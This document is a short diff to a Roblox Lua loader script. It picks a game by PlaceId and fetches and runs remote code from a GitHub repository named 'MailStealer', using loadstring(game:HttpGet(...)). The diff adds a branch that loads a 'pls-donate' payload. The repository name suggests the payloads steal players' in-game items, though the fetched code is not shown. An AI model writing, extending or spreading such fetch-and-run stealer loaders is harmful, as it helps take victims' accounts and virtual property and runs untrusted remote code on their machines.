@@ -2,4 +2,6 @@ if game.PlaceId == 8737899170 or game.PlaceId == 15502339080 or game.PlaceId == 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/main/ps99"))()
 elseif game.PlaceId == 18901165922 or game.PlaceId == 19006211286 or game.PlaceId == 133783083257328 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/main/petsgo"))()
+elseif game.PlaceId == 8737602449 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/main/pls-donate"))()
 end
